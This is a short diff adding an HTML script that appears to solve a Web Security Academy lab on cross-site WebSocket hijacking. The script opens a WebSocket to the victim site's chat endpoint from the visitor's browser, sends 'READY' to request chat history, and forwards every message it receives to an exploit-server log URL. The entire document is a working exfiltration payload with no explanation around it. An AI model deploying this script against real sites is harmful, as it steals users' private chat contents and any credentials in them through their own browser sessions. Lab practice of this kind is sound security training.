@@ -1,0 +1,13 @@
+<script>
+    var ws = new WebSocket('wss://....web-security-academy.net/chat');
+
+    ws.onopen = (event) => {
+        ws.send('READY');
+    }
+
+    ws.onmessage = (event) => {
+        fetch(`https://exploit-....exploit-server.net/log/${event.data}`, {
+            mode: 'no-cors'
+        });
+    }
+</script>
